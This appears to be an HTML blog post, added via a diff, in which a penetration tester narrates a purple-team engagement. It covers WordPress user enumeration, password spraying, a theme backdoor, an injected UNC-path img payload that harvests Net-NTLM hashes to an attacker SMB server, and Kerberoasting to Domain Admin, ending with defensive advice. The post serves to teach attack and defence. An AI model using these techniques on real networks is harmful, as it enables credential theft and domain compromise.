@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  
+
+  <title>No Responder? No problem! - Abusing HTML and UNC</title>
+  <meta name="description" content="When I first began learning about IT security, AV evasion meant encoding signatures, and ' OR '1' = '1 was enough to get into most web applications. 14 years later, security has evolved into a much different
+landscape. While the above techniques certainly still work in some cases, today’s networks are much more complex. AV’s now have sandboxes and emulators, and web applications are protected on the 7th layer.
+The last thing a consultant wants during an engagement is to be caught because one of their payloads tripped a defense mechanism.
+
+">
+  <meta name="author" content="Shad0">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="No Responder? No problem! - Abusing HTML and UNC">
+  <meta name="twitter:description" content="When I first began learning about IT security, AV evasion meant encoding signatures, and ' OR '1' = '1 was enough to get into most web applications. 14 years later, security has evolved into a much different
+landscape. While the above techniques certainly still work in some cases, today’s networks are much more complex. AV’s now have sandboxes and emulators, and web applications are protected on the 7th layer.
+The last thing a consultant wants during an engagement is to be caught because one of their payloads tripped a defense mechanism.
+
+">
+  
+  <meta name="twitter:image" content="/images/favicons/favicon-194x194.png" />
+
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="No Responder? No problem! - Abusing HTML and UNC">
+  <meta property="og:description" content="When I first began learning about IT security, AV evasion meant encoding signatures, and ' OR '1' = '1 was enough to get into most web applications. 14 years later, security has evolved into a much different
+landscape. While the above techniques certainly still work in some cases, today’s networks are much more complex. AV’s now have sandboxes and emulators, and web applications are protected on the 7th layer.
+The last thing a consultant wants during an engagement is to be caught because one of their payloads tripped a defense mechanism.
+
+">
+  <meta property="og:image" content="/images/favicons/favicon-194x194.png" />
+
+  <link rel="apple-touch-icon" sizes="57x57" href="/images/favicons/apple-touch-icon-57x57.png">
+  <link rel="apple-touch-icon" sizes="60x60" href="/images/favicons/apple-touch-icon-60x60.png">
+  <link rel="apple-touch-icon" sizes="72x72" href="/images/favicons/apple-touch-icon-72x72.png">
+  <link rel="apple-touch-icon" sizes="76x76" href="/images/favicons/apple-touch-icon-76x76.png">
+  <link rel="apple-touch-icon" sizes="114x114" href="/images/favicons/apple-touch-icon-114x114.png">
+  <link rel="apple-touch-icon" sizes="120x120" href="/images/favicons/apple-touch-icon-120x120.png">
+  <link rel="apple-touch-icon" sizes="144x144" href="/images/favicons/apple-touch-icon-144x144.png">
+  <link rel="apple-touch-icon" sizes="152x152" href="/images/favicons/apple-touch-icon-152x152.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicons/apple-touch-icon-180x180.png">
+  <link rel="icon" type="image/png" href="/images/favicons/favicon-32x32.png" sizes="32x32">
+  <link rel="icon" type="image/png" href="/images/favicons/favicon-194x194.png" sizes="194x194">
+  <link rel="icon" type="image/png" href="/images/favicons/favicon-96x96.png" sizes="96x96">
+  <link rel="icon" type="image/png" href="/images/favicons/android-chrome-192x192.png" sizes="192x192">
+  <link rel="icon" type="image/png" href="/images/favicons/favicon-16x16.png" sizes="16x16">
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" href="/images/favicons/favicon.ico">
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <link rel="stylesheet" href="/css/main.css?1535381712807826144">
+  <link rel="canonical" href="http://localhost:4000/2018/Responder/">
+  <link rel="alternate" type="application/rss+xml" title="Shad0's House" href="/feed.xml">
+</head>
+
+
+  <body>
+    <span class="mobile btn-mobile-menu">
+  <i class="icon icon-list btn-mobile-menu__icon"></i>
+  <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+</span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+  <div class="panel-main">
+
+    <div class="panel-main__inner panel-inverted">
+    <div class="panel-main__content">
+        <a href="/" title="link to home of Shad0's House">
+          <img src="/images/profile.jpg" class="user-image" alt="My Profile Photo">
+          <h1 class="panel-cover__title panel-title">Shad0's House</h1>
+        </a>
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description">Security enthusiast. Penetration tester. Adrenaline junky.</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+
+          <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item"><a href="/#blog" title="link to Shad0's House blog" class="blog-button">Blog</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+
+            
+
+            
+
+            
+
+            
+              <!-- GitHub -->
+              <li class="navigation__item">
+                <a href="https://www.github.com/Shad-0" title="Shad-0 on GitHub" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+            
+
+            
+
+            <!-- RSS -->
+            <li class="navigation__item">
+              <a href="/feed.xml" title="Subscribe" target="_blank">
+                <i class="icon icon-rss"></i>
+                <span class="label">RSS</span>
+              </a>
+            </li>
+
+            </ul>
+          </nav>
+
+        </div>
+
+      </div>
+
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+
+
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+  <header class="post-header">
+    <div class="post-meta">
+      <time datetime="2018-08-10 10:04" class="post-meta__date date">10 Aug 2018</time>
+      
+      &#8226; <span class="post-meta__tags">on <a href="/tags/#Stealth,">Stealth,</a> <a href="/tags/#Evasion,">Evasion,</a> <a href="/tags/#Internal">Internal</a> </span>
+      
+    </div>
+    <h1 class="post-title">No Responder? No problem! - Abusing HTML and UNC</h1>
+  </header>
+
+  <section class="post">
+    <p>When I first began learning about IT security, AV evasion meant encoding signatures, and <code class="highlighter-rouge">' OR '1' = '1</code> was enough to get into most web applications. 14 years later, security has evolved into a much different
+landscape. While the above techniques certainly still work in some cases, today’s networks are much more complex. AV’s now have sandboxes and emulators, and web applications are protected on the 7th layer.
+The last thing a consultant wants during an engagement is to be caught because one of their payloads tripped a defense mechanism.</p>
+
+<p>A few months ago I was part of a purple team engagement, during which a client hired us to both test their internal network security as well as their newly hired SOC’s ability to catch malicious activity.
+This was an interesting engagement because unlike most regular internal engagements, we had a team actively looking for us. This meant using our standard tools became too risky, so we had to think of a different
+approach.</p>
+
+<h3 id="1-getting-credentials-responder-maybe-not">1. Getting credentials: Responder? Maybe not.</h3>
+<p>After a quick kickoff meeting we were off. Normally, in a regular internal penetration test this is where I would fire up wireshark and start listening for NBT-NS and LLMNR broadcasts. If found, fire up Responder,
+collect some Net-NTLM hashes, throw hashcat at them and in some cases, r00t dance. However, we figured this would likely get us caught. To explain why, lets go back to how and why Responder works. I am not going to go
+into the details of Responder and NBT-NS/LLMNR poisoning as the internet is filled with explanations of the attack. Suffice to say that when DNS fails to resolve a hostname for whatever reason 
+(user “fat fingers” the name, DNS UDP packet - yes, <a href="https://www.ietf.org/rfc/rfc1035.txt">UDP</a> - gets dropped, or some other reason) it turns back to Link Layer Multicast Name Resolution and NetBios name
+service to resolve the name. It does this by sending a broadcast literally asking who the host is.</p>
+
+<p><img src="http://localhost:4000/images/responder/Query_Broadcast.png" alt="Who there" /></p>
+
+<p>This is where Responder comes in. Depending on how its run, Responder may reply to some/all queries saying saying yep thats me. This then kicks off the NTLM authentication scheme and results in the 
+challenge-response Net-NTLM hash we then proceed to crack or relay.</p>
+
+<p><img src="http://localhost:4000/images/responder/response.png" alt="l00t" /></p>
+
+<p>So, now that we know how the attack works, can you think of how detection works? Well, if Responder is run to respond to all queries where DNS fails, it will respond to everything. If a security appliance
+were to broadcast someting that it knows is not present in the network like \\thisdoesnotexist\, it can assume that anything that responds to this will likely be malicious and raise a flag.</p>
+
+<p>Well, the network is safe, lets pack it up and go home, blue team won.</p>
+
+<p>Not quite.</p>
+
+<p>Enumerating the network further we found the intranet 
+page. A quick look revealed it was running WordPress, which meant if we could just get access to an account we could probably get code execution. Again, a vulnerability
+scanner like WPScan would have been great here, but as stealth was important we opted for a manual approach. Examination revealed a fully patched installation, and looking through some of the source 
+we saw references to a security plugin which made things a bit harder. We had two options. Either find an 0day in a plugin/Wordpress, which in a time boxed engagement is basically a no go, or compromise a user account.
+Wordpress has a very handy feature that allows for username enumeration by appending <code class="highlighter-rouge">/?author=1</code> to the url. We tested this in the browser and succesfully got the username of the first account.
+We then scripted the attack, being mindful of pausing a few minutes between requests, and tried enumerating the first 100 accounts. This yielded 76 different user accounts. We then tried a password spray with
+good ol’ <code class="highlighter-rouge">Password1</code> (you’d be surprised how many times that works) and success! 4 accounts went down, one of which was an administrator.</p>
+
+<p>A backdoor on one of the theme pages got us code execuion on the server, which showed WordPress running as a restricted user. Looking for easy kills for privilege escalation did not result in anything obvious
+so instead we opted to leverage our WordPress access to harvest some Net-NTLM hashes.</p>
+
+<p>Net-NTLM hashes are the result of the NTLM challenge-response authentication scheme. Basically, when client A tries to access a resource on Server B, it must authenticate against it first. The process can be found in <a href="https://docs.microsoft.com/en-us/windows/desktop/SecAuthN/microsoft-ntlm">Microsoft documentation</a>
+but sumarized below:</p>
+
+<hr />
+<ol>
+  <li>
+    <p>(Interactive authentication only) A user accesses a client computer and provides a domain name, user name, and password. The client computes a cryptographic hash of the password and discards the actual password.</p>
+  </li>
+  <li>
+    <p>The client sends the user name to the server (in plaintext).</p>
+  </li>
+  <li>
+    <p>The server generates a 16-byte random number, called a challenge or nonce, and sends it to the client.</p>
+  </li>
+  <li>
+    <p>The client encrypts this challenge with the hash of the user’s password and returns the result to the server. This is called the response.</p>
+  </li>
+  <li>
+    <p>The server sends the following three items to the domain controller:
+  User name
+  Challenge sent to the client
+  Response received from the client</p>
+  </li>
+  <li>
+    <p>The domain controller uses the user name to retrieve the hash of the user’s password from the Security Account Manager database. It uses this password hash to encrypt the challenge.</p>
+  </li>
+  <li>
+    <p>The domain controller compares the encrypted challenge it computed (in step 6) to the response computed by the client (in step 4). If they are identical, authentication is successful.</p>
+  </li>
+</ol>
+
+<hr />
+<p>There are significant differences between NTLMv1 and NTLMv2, but thats a topic for a different post. As we are dealing with windows 7/2008+ systems, NTLM here refers to NTLMv2.</p>
+
+<p>From the above we can see that if we can somehow get someone to try and access a resource on our system (acting as the server on the above example), we’ll be able to grab the Net-NTLM hash. 
+There are many different ways of accomplishing this but the more interesting one given the circumstances is through HTML.
+IE and EDGE (although ive succesfully tested with Chrome as well) both support UNC paths to load resources (such as images). An image tag like <code class="highlighter-rouge">&lt;img src="\\x.x.x.x\doesnotmatter.png" /&gt;</code> would try to pull
+<code class="highlighter-rouge">doesnotmatter.png</code> from <code class="highlighter-rouge">x.x.x.x</code>, which would kick off the authentication process with <code class="highlighter-rouge">x.x.x.x</code>. Since the code executes in the browser of the client browsing our evil page, 
+the resulting hash would belong to the user using the browser.</p>
+
+<p>So, to recap: We have managed to gain administrative access to the WordPress site of the companies internal intranet, where it is safe to assume most browsers will land on when opened, and a way to abuse
+evil html to grab NetNTLM hashes. See where im going with this?</p>
+
+<p><img src="http://localhost:4000/images/responder/wp.png" alt="knock knock" /></p>
+
+<p>Before saving the above, I started Metasploit’s SMB server to catch all incoming connections. Note that I could have also used Impacket’s smbserver.py or even Responder by disabling the responses to queries,
+but Metasploit was just convenient at the time. As soon as the server was started and the file saved, hashes from all over the domain started flying in! In total I believe we gathered over 200 hashes in under an 
+hour.</p>
+
+<p><img src="http://localhost:4000/images/responder/msf.png" alt="Who there" /></p>
+
+<p><em>Edit: If administrative access is available or there is access to a system with wireshark installed, and our smbserver tools are not available, I strongly recommend collecting hashes</em>
+<em>with wireshark. Once enough hashes have been collected, bring the pcap over to a linux box and extract the NetNTLM hashes with <a href="https://github.com/DanMcInerney/net-creds">this</a> fantastic tool</em></p>
+
+<h3 id="pwning-the-domain-red-team-1-blue-team-0">Pwning the Domain: Red team 1, Blue team 0</h3>
+
+<p>With plenty of hashes, the next step was to crack them and begin moving laterally. Hashcat cracked roughly 20 accounts in a relatively short period of time. Checking these account’s permissions we discovered
+that none had elevated privileges. No matter, with domain credentials its usually only a matter of time before the domain goes down. Remembering the SOC’s watchfull eyes over us, we kept our recognizance
+to a minimum to prevent tripping any alert from monitoring systems. Instead, we opted for what are considered easy kills, which meant Kerberoasting.</p>
+
+<p>Kerberoasting is the name of the attack given by <a href="https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf">Tim Medina in 2014</a> to attacking Microsoft Windows Kerberos authentication. 
+While a full description is out of scope, The following graphic taken from <a href="https://technet.microsoft.com/pt-pt/library/cc772815(v=ws.10).aspx">Microsoft</a> illustrates the basics we need to understand for this attack:</p>
+
+<p><img src="http://localhost:4000/images/responder/kerberos.gif" alt="Kerberos" /></p>
+
+<p>To summarize the above, at logon, the client contacts the Key Distribution Center (KDC) and requests a Ticket Ticket Grating Ticket (TGT) from the KDC. The KDC valdiates the users information, such as 
+permissions and group memberships, and if they check out it will issue a TGT. If the user then wishes to access a service, it will need to supply the TGT as well as the target’s service principal
+name (SPN). A SPN <a href="https://social.technet.microsoft.com/wiki/contents/articles/717.service-principal-names-spns-setspn-syntax-setspn-exe.aspx">is the name by which a Kerberos client uniquely identifies an instance of a service for a given Kerberos target computer</a>
+After verifying the data in the TGT (which only the KDC can read). the KDC will issue a TGS back to the client which <em>is signed with the target SPN’s NTLM hash</em>. The TGS will then be presented to the service, 
+which will ultimately decide whether or not to provide access.</p>
+
+<p>We are interested in step 3/4. In modern systems, Kerberos uses AES encryption to encrypt the TGS ticket. However, this was not introduced until <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-vista/cc749438(v=ws.10)">Windows Vista/ and Windows 2008</a>. 
+Since Active Directory’s introduction in Windows 2000, Windows has used RC4_HMAC symmetric encryption which uses the target SPN’s NT (or NTLM as some of you may know it)
+hash as the encryption/decryption key! Even though AES is the default, RC4 is still found due to
+compatability requriements (since some services/systems do not yet support AES). If we look at the graffic above, any user can request a TGT from the KDC with valid domain credentials.
+These do not have to belong to any privileged group - Kerberos lets the target service/system decide whether or not to grant permission to the user to use the service - which means any low privilege account can
+get as many TGS tickets for different SPN’s as we want! There are certain restrictions in regards to which SPN’s are better for cracking and why, and if you’d like to know more I strongly recommend going <a href="https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf">here</a>
+and <a href="https://adsecurity.org/?p=2293">here</a>.</p>
+
+<p>Cool, so how does this help us? Well, the accounts created for services are usually over permissioned and part of the Domain Admin’s group, as well as have passwords that are set to not expire, usually created
+by a human (which as we know are horrible at creating truly random passwords). This means if we request TGS tickets encrypted with RC4 for a specific (or all available) SPN’s, we can then attempt to open the tickets
+by computing various NTHashes and trying to open the ticket. If we are succesful, it means we have the correct NTHash, which means we would have found the correct password for the target service account!
+The best part? <strong><em>All this is done offline</em></strong>. The attack is very hard to detect, because there are no explotis being launched, no malware being placed on any target system, and no bruteforcing being done against
+AD. Although there <a href="https://adsecurity.org/?p=3513">are ways to detect the attack</a>, we felt fairly confident the logs were not being monitored to this degree.</p>
+
+<p>We used Impacket’s GetSPNs.py to request a list of all suiteable SPN’s for cracking using one of the cracked accounts, and got to work. A short time later, there was a hit. Sure enough, after checking the account’s
+group membership there it was: Domain Admins.</p>
+
+<p><img src="http://localhost:4000/images/responder/getuserspn.png" alt="Kerberos" /></p>
+
+<p>From here it was easy to grab the crown jewels. A few screen shots later, we had everythind we needed and the engagement was done. Throughout the whole test we managed to stay hidden from the SOC and raised no flags. 
+As part of the engagement, our report was given to them, and we had the chance to work with them on defenses and indicators against the above attacks. 
+In both WordPress and Kerberoasting instances, the underlying issue was not enforcing the least privilege principle. Over permissioned accounts in WordPress with weak credentials led to the disclosure of 
+hundreds of domain account hashes, which gave us the foothold required to request TGS tickets. Weak passwords allowed these to be cracked, which once again due to excessive permissions led to the 
+compromise of the whole Active Directory environment.</p>
+
+
+  </section>
+  
+</article>
+
+
+
+      </div>
+
+      <footer class="footer">
+  <span class="footer__copyright">&copy; 2018 Shad0. All rights reserved.</span>
+</footer>
+
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1535381712807826144"></script>
+
+
+    </div>
+  </body>
+</html>
